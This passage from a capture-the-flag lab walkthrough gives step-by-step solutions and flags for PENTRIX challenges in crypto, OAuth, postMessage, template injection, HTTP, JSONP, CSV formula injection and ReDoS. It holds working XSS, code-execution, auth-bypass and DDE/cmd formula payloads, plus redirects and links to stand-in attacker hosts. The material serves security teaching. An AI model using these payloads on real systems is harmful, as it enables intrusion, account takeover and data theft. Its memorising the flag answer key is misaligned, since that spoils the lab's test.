3. Flip the IV bytes over it: `iv[9+i] ^= 'guest'[i] ^ 'admin'[i]` for `i` in 0..4. Reassemble `base64(new_iv || ciphertext)`.
4. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/check --data-urlencode "cookie=<forged>"`. The server decrypts it, sees `role = 'admin'`, and prints `PENTRIX{crypto_crypto-cbc-bitflip}`.
Why it works: CBC decryption XORs each block with the previous ciphertext block (or IV), so IV bit flips cause predictable plaintext bit flips, and the cookie has no integrity check (no MAC) to reject the tampering.

**4. Hash Length Extension** – `PENTRIX{crypto_crypto-hash-ext}`
1. `GET /crypto/mac/sign?msg=role%3Duser` returns `{"msg": "role=user", "mac": "<sha256 hex>"}`. The page states the secret is 16 bytes, and the signer refuses any message containing `admin`.
2. In pure code (a from-scratch SHA-256 with injectable initial state; no new dependencies), take the returned MAC as the compression state. Build the glue padding for a 25-byte prefix (16 secret + 9 message bytes): `0x80`, zeros, then the 64-bit big-endian bit length.
3. Forged message = `role=user || glue || ;admin=1` (hex-encode it as `msghex`). Forged MAC = continue SHA-256 from the leaked state over `;admin=1 || padding-for-72-bytes`.
4. `POST /crypto/mac/verify` with `msghex=<hex>` and `mac=<forged hex>`. The response contains `PENTRIX{crypto_crypto-hash-ext}`.
Why it works: SHA-256 is Merkle-Damgard, so its digest is the entire internal state; anyone holding one valid MAC can append data and compute a valid MAC for the longer message without ever learning the secret.

**5. Crack the MD5** – `PENTRIX{crypto_crypto-md5-crack}`
1. Read the leaked hash from `/crypto/md5` (it is `0571749e2ac330a7455809c6b0e7af90`, fixed per lab design).
2. Fetch `/crypto/md5/wordlist.txt` and MD5 each of the 48 candidates until one matches: the password is `sunshine`.
3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/md5/login --data-urlencode "username=demo" --data-urlencode "password=sunshine"`. The login succeeds and prints `PENTRIX{crypto_crypto-md5-crack}`.
Why it works: an unsalted, fast MD5 of a dictionary word falls to an offline dictionary attack in milliseconds.

**6. Base64 "Encryption"** – `PENTRIX{crypto_crypto-b64-cookie}`
1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/login` and copy the cookie from `<code id="ck">`.
2. Decode it: `echo '<cookie>' | base64 -d` gives `{"user":"guest","role":"user"}`. Change `"role":"user"` to `"role":"admin"` and re-encode with base64.
3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/check --data-urlencode "cookie=<re-encoded>"`. The response prints `PENTRIX{crypto_crypto-b64-cookie}`.
Why it works: the "encryption" was only base64 encoding, which is trivially reversible, and the server trusts whatever decodes to valid JSON.

**7. XOR Crib Dragging** – `PENTRIX{crypto_crypto-xor-crib}`
1. Copy the ciphertext hex from `<code id="ct">` on `/crypto/xor`.
2. The page tells you every document starts with the 9-byte header `{"user":"`. For each candidate key length 1-12: derive `key[i mod L] = ct[i] XOR crib[i]` over the crib, decrypt the full ciphertext, and keep the length that yields valid JSON. (Length 8 wins; the key and token are random per boot. One run recovered key `aa9bf2fdf48bd86d` and plaintext `{"user":"guest","token":"6a6a86ab2543cd2d"}`.)
3. `POST /crypto/xor/solve` with `plaintext=<recovered JSON>`. The response contains `PENTRIX{crypto_crypto-xor-crib}`.
Why it works: a short repeating XOR key turns known plaintext into known keystream, so the crib exposes the key bytes and the rest of the message decrypts.

**8. Key in JavaScript** – `PENTRIX{crypto_crypto-key-in-js}`
1. `curl http://localhost:3000/crypto/keyjs/app.js` and read the key: `const ENCRYPTION_KEY = 'PenTrixKey2026!!';` (16 bytes, hardcoded in the served bundle).
2. Copy the ciphertext hex from `<code id="ct">` on `/crypto/keyjs`. The first 16 bytes are the IV. Decrypt AES-128-CBC with the stolen key, e.g. in Node:
   `crypto.createDecipheriv('aes-128-cbc', Buffer.from('PenTrixKey2026!!'), iv)`.
   The note decrypts to `Vault combination: 04-17-2026. Do not share.`
3. `POST /crypto/keyjs/solve` with `plaintext=<decrypted note>`. The response contains `PENTRIX{crypto_crypto-key-in-js}`.
Why it works: a key shipped to the browser is public to every visitor, and with the IV prepended to the ciphertext anyone can decrypt the "client-side encrypted" note offline.
---

## oauth – OAuth Flaws

**1. Redirect URI Prefix Bypass** – `PENTRIX{oauth_redirect-bypass}`

1. Log in to the IdP as alice: `GET /oauth/login/alice`.
2. Open the authorization URL with an attacker-controlled redirect URI that still
   starts with the trusted prefix:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=http%3A%2F%2Fapp.pentrix.lab.evil.com%2Fcb&response_type=code&scope=read
   ```
   The prefix check `redirect_uri.startsWith("http://app.pentrix.lab")` passes
   because the string starts with the prefix even though the host is
   `app.pentrix.lab.evil.com`.
3. Approve the request. The approval page shows the flag: the IdP issued a code
   and redirected it to a foreign host.
   Equivalent curl (with the cookie jar from step 1):
   ```
   curl -b jar -c jar -X POST --data "client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=read" http://localhost:3111/oauth/idp/approve
   ```
   (fields copied from the hidden inputs on the authorize page)
Why it works: redirect validation uses a naive string-prefix check instead of an
exact match against the registered URI, so `http://app.pentrix.lab.evil.com/cb`
passes and the code leaves for the attacker host.

**2. Authorization Code Leaked in Server Log** – `PENTRIX{oauth_code-leak}`

1. Open `GET /oauth/idp/log`. Every issued code is written there in clear, and a
   recent login by alice is pre-seeded. Copy her code, e.g.
   `code=de0b4b47e4dba33240d038d55ef17d9b`.
2. Log in to the IdP as bob (a different user) and exchange her code directly:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<alice-code>" http://localhost:3111/oauth/idp/token
   ```
   Response contains `access_token` and `flag: PENTRIX{oauth_code-leak}`.
   (`pentrix-spa` is a public client, so no secret is needed.)
Why it works: codes are secrets, but the IdP logs them to a world-readable log,
and the token endpoint accepts a code whose owner differs from the requester.

**3. Login CSRF (Missing state Parameter)** – `PENTRIX{oauth_no-state}`

1. As the attacker, log in to the IdP as bob and open
   `GET /oauth/no-state/attacker`. It mints a code for bob's account and prints
   a malicious link like `/oauth/client/callback?code=<bob-code>`.
2. As the victim (a session logged in to the IdP as alice), visit that link:
   ```
   curl -b jar-alice -c jar-alice "http://localhost:3111/oauth/client/callback?code=<bob-code>"
   ```
   The response shows `PENTRIX{oauth_no-state}` and explains that the client
   session is now bob while the IdP session is alice: alice is logged in to the
   client **as the attacker**.
Why it works: the client callback exchanges any `code` it is given and never
validates a `state` parameter, so an attacker-minted code silently logs the
victim in under the attacker's account.

**4. Implicit Flow Token in URL Fragment** – `PENTRIX{oauth_implicit}`

1. As the victim (alice), run the implicit flow and approve it:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc client host>&response_type=token&scope=read
   ```
   Copy the resulting fragment, e.g. `#access_token=b096f586dc18...&token_type=Bearer`.
2. Simulate the victim browser landing on the callback URL with that fragment.
   The in-lab page records the full URL in browser history; equivalent curl:
   ```
   curl -X POST -H 'Content-Type: application/json' \
     --data '{"url":"http://app.pentrix.lab/callback#access_token=<tok>&token_type=Bearer"}' \
     http://localhost:3111/oauth/client/history-log
   ```
3. As the attacker, read `GET /oauth/client/history`, steal the token, and call
   userinfo with it:
   ```
   curl "http://localhost:3111/oauth/idp/userinfo?access_token=<tok>"
   ```
   Response contains `flag: PENTRIX{oauth_implicit}`.
Why it works: the implicit flow puts the access token in the URL fragment, and
fragments are kept in browser history, so anyone who can read the history owns
the token and the IdP accepts it regardless of who presents it.

**5. Scope Tampering** – `PENTRIX{oauth_scope-upgrade}`

1. As bob (a plain user), authorize with a scope you were never granted:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=admin
   ```
   Approve and copy the code.
2. Exchange the code and use the token on the admin-only endpoint:
   ```
   curl -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   curl "http://localhost:3111/oauth/idp/admin-data?access_token=<tok>"
   ```
   Response contains the admin secret and `flag: PENTRIX{oauth_scope-upgrade}`.
Why it works: the authorize endpoint takes `scope` from the request and grants
whatever is asked for without checking the user's role.

**6. Client Secret in Public JavaScript** – `PENTRIX{oauth_secret-in-js}`

1. Download the public bundle: `GET /oauth/client/app.js`. It contains the
   confidential client's secret in clear:
   ```
   var CLIENT_SECRET = 'sk_live_9f2c7b41d8e0a5c6';
   ```
2. As bob, authorize the confidential client (`client_id=pentrix-client`,
   `response_type=code`) and approve; copy the issued code.
3. Exchange the code directly at the token endpoint with the stolen secret:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-client&client_secret=sk_live_9f2c7b41d8e0a5c6&code=<code>" http://localhost:3111/oauth/idp/token
   ```
   Response contains `flag: PENTRIX{oauth_secret-in-js}`.
Why it works: a "confidential" client's secret is shipped to every browser in
the public JavaScript bundle, so it is not secret at all and anyone can
complete the confidential-client exchange.

**7. Authorization Code Replay** – `PENTRIX{oauth_code-replay}`

1. As bob, authorize `pentrix-spa` (`response_type=code`) and approve; copy the code.
2. Exchange the same code twice:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   ```
   Both responses return valid, different access tokens; the second response
   contains `flag: PENTRIX{oauth_code-replay}`.
Why it works: the IdP counts code uses but never invalidates them, so a
single-use code stays valid forever.

**8. PKCE Downgrade** – `PENTRIX{oauth_pkce-skip}`

1. As bob, authorize with a code challenge:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=read&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256
   ```
   Approve and copy the code.
2. Exchange the code with **no** `code_verifier`:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   ```
   Response contains a valid token and `flag: PENTRIX{oauth_pkce-skip}`.
Why it works: the IdP records the challenge but the token endpoint never
requires the verifier, so PKCE provides no binding at all.

---
---

## postmsg – postMessage Flaws

**1. No Origin Check on Message Handler** – `PENTRIX{postmsg_no-check}`

1. Open `/postmsg/no-check/attacker` in the browser.
2. Click "Fire payload". The attacker page runs:
   ```
   document.getElementById('v').contentWindow.postMessage(
     '<img src=x onerror="document.getElementById(\'log\').textContent=\'XSS via postMessage\'">', '*');
   ```
3. The victim widget's handler writes `e.data` into `innerHTML` with no origin
   check, executes the markup, and beacons `v=no-check`.
Why it works: the `message` listener trusts any sender and renders the payload
as HTML, so any website can inject markup (and scripts) into the victim page.

**2. Secret Leaked via Wildcard targetOrigin** – `PENTRIX{postmsg_wildcard}`

1. Open `/postmsg/wildcard/attacker` in the browser. It embeds the victim
   widget in an iframe.
2. On load, the victim widget runs
   `parent.postMessage({ token: SECRET_TOKEN, from: 'trusted-widget' }, '*')`.
   The attacker page listens, captures `e.data.token`, and beacons
   `v=wildcard&d=wildcard:<token>`. The beacon only awards when the payload
   contains the session's real secret (verified: a wrong token is rejected).
Why it works: `targetOrigin '*'` broadcasts the secret to every embedding page,
including a malicious one, which just listens and forwards it.

**3. Unsanitized Message Data Rendered as HTML** – `PENTRIX{postmsg_data-xss}`

1. Open `/postmsg/data-xss/attacker` in the browser.
2. Click "Fire payload". The attacker page posts an object, not a string:
   ```
   document.getElementById('v').contentWindow.postMessage(
     { html: '<img src=x onerror="alert(\'postMessage XSS\')">' }, '*');
   ```
3. The victim takes `e.data.html` and drops it into `innerHTML` unsanitized,
   then beacons `v=data-xss`.
Why it works: message data is rendered as raw HTML with no sanitization, so an
object-shaped message becomes live markup in the victim page.

**4. Substring Origin Check Bypass** – `PENTRIX{postmsg_substring}`

1. Open `/postmsg/substring/attacker`. The victim checks
   `originToTest.includes('pentrix.lab')`, so an attacker domain containing that
   string passes: `'https://pentrix.lab.evil.com'.includes('pentrix.lab')` is
   true.
2. The lab simulates the attacker origin (`?simulateOrigin=https://pentrix.lab.evil.com`,
   shown in a banner, since a local lab cannot mint DNS origins) and the
   vulnerable `includes()` check itself is the real code under test.
3. Click "Fire payload". The check passes, the HTML is rendered, and the victim
   beacons `v=substring`.
Why it works: a substring match instead of an exact comparison lets
`https://pentrix.lab.evil.com` ride on the trusted string `pentrix.lab`.

**5. Privileged Action via Forged Message** – `PENTRIX{postmsg_csrf-action}`

1. Open `/postmsg/csrf-action/attacker` in the browser. It embeds the victim's
   account settings page.
2. Click "Fire payload". The attacker page posts:
   ```
   document.getElementById('v').contentWindow.postMessage({ action: 'delete-account' }, '*');
   ```
3. The victim handler fires `POST /postmsg/csrf-action/delete` with no origin
   check and no confirmation, deletes the account, and beacons
   `v=csrf-action&d=csrf-action:account-deleted`. The beacon only awards if the
   deletion really happened (verified: pre-deletion beacon is rejected).
   Reset the lab account via `/postmsg/csrf-action/reset`.
Why it works: a state-changing action is driven by any cross-origin message
with no origin verification and no user confirmation, which is CSRF delivered
through postMessage.

---
---

## csti – Client-Side Template Injection

**1. Basic Template Evaluation** – `PENTRIX{csti_basic}`

1. Open `/csti/basic` and save a greeting containing an expression, e.g.
   `Hello {{7*7}}!`.
2. The preview renders `Hello 49!`. The page's JavaScript sees `49` in the
   rendered output and beacons `v=basic&d=49`, awarding the flag.
Why it works: `{{ expression }}` is compiled with `Function` and executed, so
any arithmetic (or JavaScript) inside the delimiters evaluates in the victim's
browser.

**2. Filter Bypass via Alternative Delimiter** – `PENTRIX{csti_filter-bypass}`

1. Open `/csti/filter-bypass`. Submitting `{{7*7}}` is rejected with
   "Blocked by the filter" (the server refuses any template containing `{{`
   or `}}`; verified with curl: HTTP 400).
2. The client engine also evaluates a second delimiter syntax the filter never
   heard of. Save `[[7*7]]` instead: it is accepted (HTTP 302) and the preview
   renders `49`, which beacons `v=filter-bypass`.
Why it works: the blacklist is server-side and only knows `{{ }}`, while the
client-side engine evaluates `[[ ]]` too, so the filter and the engine disagree
about what is a template.

**3. Constructor Breakout to Code Execution** – `PENTRIX{csti_constructor}`

1. Open `/csti/constructor`. Every expression can see `constructor` (which is
   `Object`), and `Object.constructor` is `Function`, so a template can compile
   and run arbitrary code.
2. Save this template:
   ```
   {{constructor.constructor("fetch('/csti/beacon?v=constructor&d=' + encodeURIComponent('code-executed'))")()}}
   ```
3. When the preview renders, the expression compiles the string with `Function`
   and runs it; the fetch hits the beacon and awards the flag. Proven against
   the served engine: the payload fires a fetch to exactly
   `/csti/beacon?v=constructor&d=code-executed`.
Why it works: exposing `constructor` in the expression scope hands out `Function`,
turning template evaluation into arbitrary JavaScript execution in the victim's
browser.

**4. CSTI Inside an HTML Attribute** – `PENTRIX{csti_attr}`

1. Open `/csti/attr` and save `{{7*7}}` as the badge text. View source: the
   server entity-encodes it into the `value` attribute.
2. The page's JavaScript reads the attribute back with `getAttribute('value')`
   (which decodes the entities), runs the raw template through `cstiRender`,
   and the badge shows `49`, which beacons `v=attr`.
Why it works: server-side entity encoding only changes how the bytes look in
HTML source; `getAttribute` decodes them back, and encoding never stopped the
client-side engine from evaluating the template.

**5. Stored Template in Profile Name** – `PENTRIX{csti_stored}`

1. Open `/csti/stored` and save `{{7*7}}` as a display name. It is stored in the
   database (`csti_profiles`) and rendered on every view.
2. Reload the member list: every visitor's browser evaluates the stored name
   as a template, the list shows `49`, and the page beacons `v=stored`.
Why it works: stored display names are evaluated as templates on every view, so
the injection persists and fires for every visitor, not just the attacker.
---

## http – HTTP Layer Flaws

**1. CRLF Log Injection** – `PENTRIX{http_crlf-log}`

1. Inject CR/LF bytes via the tracked ref parameter:
   `curl "http://localhost:3112/http/track?ref=homepage%0d%0a2026-10-02T00:00:00.000Z%20FAKE%20admin%20login%20from%2010.9.9.9"`
   The response page shows the flag.
2. Open `http://localhost:3112/http/admin/log` and confirm the forged
   `FAKE admin login` line appears as its own log entry.

Why it works: the raw ref value, CR/LF bytes included, is written to the
access log with no sanitization, so `%0d%0a` splits one entry into two, and
the log viewer renders the injected HTML raw.

**2. HTTP Method Override** – `PENTRIX{http_method-override}`

1. The inventory page (`/http/items`) only offers "request deletion" buttons
   that POST and delete nothing.
2. Bypass it with the override parameter:
   `curl -X POST --data "_method=DELETE" http://localhost:3112/http/items/2`
   The item is deleted and the flag is shown. Reload `/http/items` to confirm
   item #2 is gone (use `/http/items/reset` to restore the demo data).

Why it works: the app rewrites `req.method` from the `_method` body
parameter, so a plain POST is routed to the DELETE handler the UI never
exposes.

**3. Verb Tampering** – `PENTRIX{http_verb-tamper}`

1. The feedback form posts to `/http/feedback` and the page says POST-only.
2. Submit the same action as GET:
   `curl "http://localhost:3112/http/feedback?msg=hello"`
   The feedback is recorded and the flag is shown.

Why it works: the same handler is registered for both GET and POST, so the
"POST-only" endpoint performs its state change over GET too (bookmarkable,
loggable, CSRF-able).

**4. X-Forwarded-For Trust** – `PENTRIX{http_xff-admin}`

1. `curl http://localhost:3112/http/internal` returns 403.
2. Add the header yourself:
   `curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:3112/http/internal`
   The internal admin panel renders with the flag.

Why it works: admin access is granted from the client-controlled
`X-Forwarded-For` header, which any client can set to `127.0.0.1`.

**5. Cache Deception** – `PENTRIX{http_cache-deception}`

1. Purge the demo cache: open `http://localhost:3112/http/cache-purge`.
2. As the victim: open `http://localhost:3112/http/cache-login?user=alice`,
   then open `http://localhost:3112/http/account.css`. The response header
   says `X-Cache: MISS` and the CDN caches alice's personalized stylesheet.
3. As the attacker (fresh session: private window, or curl without the
   victim's cookie): `curl -i http://localhost:3112/http/account.css`
   You get `X-Cache: HIT`, the body still contains
   `ALICE-CDN-SECRET-9d2f`, and the `X-Flag` header carries the flag.

Why it works: the naive cache is keyed on the URL path only, so the victim's
personalized response (sent with `Cache-Control: public, max-age=3600`) is
served to every later visitor.

**6. Referer-Based Auth** – `PENTRIX{http_referer-auth}`

1. `curl http://localhost:3112/http/hidden` returns 403.
2. Send your own Referer:
   `curl -H "Referer: https://partner.example/trusted/page" http://localhost:3112/http/hidden`
   The partner portal renders with the flag.

Why it works: authorization checks the client-controlled `Referer` header for
the substring `/trusted`, which any client can supply.
---

## jsonp – JSONP Injection

**1. Callback XSS** – `PENTRIX{jsonp_callback-xss}`

1. `curl -i "http://localhost:3112/jsonp/user?callback=alert(1)//"`
2. The body is `alert(1)//({"user":"alice","role":"user"});` served as
   `application/javascript`, and the `X-Flag` header carries the flag.

Why it works: the callback name is reflected into executable JavaScript with
no validation, so it breaks out of the function-call context.

**2. JSONP Data Theft** – `PENTRIX{jsonp_csrf-data}`

1. While "logged in", visit `http://localhost:3112/jsonp/attacker` in the
   browser. The page's `<script src="/jsonp/data?callback=steal">` pulls the
   victim's JSONP feed (classic script tags ignore the Same-Origin Policy),
   then POSTs the data to `/jsonp/beacon`, which replies with the flag.
2. Manual equivalent:
   `curl -X POST -H "Content-Type: application/json" --data '{"user":"alice","secret":"ALICE-JSONP-SECRET-7f3a9c"}' http://localhost:3112/jsonp/beacon`

Why it works: sensitive data served as JSONP is readable cross-origin by any
site that can get the victim to load a script tag.

**3. Callback Filter Bypass** – `PENTRIX{jsonp_filter-bypass}`

1. `callback=alert(1)` is rejected with 400 (the word "alert" is blocked).
2. Rebuild it at runtime (URL-encoded):
   `curl -i "http://localhost:3112/jsonp/filtered?callback=x%3Btop%5B%27al%27%2B%27ert%27%5D%281%29%3B%2F%2F"`
   which decodes to `x;top['al'+'ert'](1);//`. The response executes it and
   the `X-Flag` header carries the flag.

Why it works: the blocklist only bans the literal word "alert", but string
concatenation rebuilds it at runtime where the filter never looks.

**4. Array Constructor Hijack** – `PENTRIX{jsonp_array-hijack}`

1. Visit `http://localhost:3112/jsonp/array-attacker` in the browser. The
   page saves the real `Array`, overrides the global constructor, loads
   `/jsonp/legacy?callback=gotFriends`, captures the elements, and beacons
   them to `/jsonp/array-beacon`, which replies with the flag.
2. Manual equivalent:
   `curl -X POST -H "Content-Type: application/json" --data '{"items":["alice:A1","bob:B2","carol:C3"]}' http://localhost:3112/jsonp/array-beacon`

Why it works: the legacy endpoint builds its JSONP with `new Array(...)`,
so a page that overrides the global `Array` constructor before loading the
feed intercepts every element (the classic 2007 hijack).

**5. JSONP MIME Sniffing** – `PENTRIX{jsonp_mimetype}`

1. `curl -i "http://localhost:3112/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
2. The response is `Content-Type: text/html` with
   `<script>alert(1)</script>({"note":"hello"});` in the body, and the
   `X-Flag` header carries the flag.

Why it works: JSONP served as `text/html` is parsed as a document, so HTML in
the callback executes when the URL is visited directly or framed.
---

## formula – CSV Formula Injection

**1. Classic Formula Injection** – `PENTRIX{formula_formula-csv}`

`curl -X POST --data-urlencode "name==cmd|'/c calc'!A0" --data-urlencode "note=classic" http://localhost:3112/formula/add`
then `curl -i http://localhost:3112/formula/export.csv` shows the raw
`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{formula_formula-csv}`.

Why it works: cells are CSV-quoted but never neutralized, so a leading `=`
reaches the spreadsheet as a live formula.

**2. DDE Command Execution** – `PENTRIX{formula_formula-dde}`

`curl -X POST --data-urlencode 'name==DDE("cmd";"/c calc";"!A0")' http://localhost:3112/formula/add`
then export. Awards `PENTRIX{formula_formula-dde}`.

Why it works: the `=DDE(...)` function form survives quoting and asks an
external application to run the command when the sheet opens.

**3. HYPERLINK Exfiltration** – `PENTRIX{formula_formula-hyperlink}`

`curl -X POST --data-urlencode 'name==HYPERLINK("http://evil.example","click me")' http://localhost:3112/formula/add`
then export. Awards `PENTRIX{formula_formula-hyperlink}`.

Why it works: `HYPERLINK` renders an attacker URL behind an innocent label
and can be combined with cell references to leak neighboring data.

**4. Pipe Prefix (LibreOffice)** – `PENTRIX{formula_formula-pipe}`

`curl -X POST --data-urlencode 'name=|/usr/bin/xcalc' http://localhost:3112/formula/add`
then export. Awards `PENTRIX{formula_formula-pipe}`.

Why it works: the pipe-prefixed cell is LibreOffice's formula trigger
variant, and it reaches the export unsanitized like the rest.
---

## redos – ReDoS

**1. Catastrophic Email Regex** – `PENTRIX{redos_redos-email}`

`time curl "http://localhost:3112/redos/email?email=$(python3 -c "print('a'*30+'!'")"`
(30 a's followed by `!`, no `@` anywhere). Takes several seconds; the flag
is shown on the result page.

Why it works: the nested quantifier `((...+)+)` in the local part tries every
way to partition the 30-character run before failing on the missing `@`.

**2. Nested Quantifier Username** – `PENTRIX{redos_redos-username}`

`time curl "http://localhost:3112/redos/username?username=$(python3 -c "print('a'*27+'!'")"`
(27 a's followed by `!`). Takes several seconds; the flag is shown.

Why it works: the textbook catastrophic pattern `^(a+)+$` backtracks over
every partition of the a-run before the trailing `!` fails the match.

**3. Catastrophic URL Regex** – `PENTRIX{redos_redos-url}`

`time curl --get --data-urlencode "url=$(python3 -c "print('http://example.com/'+'a/'*12+'!'")"` http://localhost:3112/redos/url`
Takes several seconds; the flag is shown.

Why it works: the nested quantifiers `([\/\w .-]*)*` in the path group
explode when a long repeated path ends with a character the pattern rejects.

**4. Regex Injection Search** – `PENTRIX{redos_redos-search}`

`time curl "http://localhost:3112/redos/search?q=a"`
The query is compiled to `^((a)+)+$` and tested against a fixed haystack of
26 a's plus `!`. Takes several seconds; the flag is shown.

Why it works: the search query is interpolated as the repeated atom of the
template's nested quantifiers, so matching the haystack's character gives the
backtracking engine an exponential number of partitions to try.
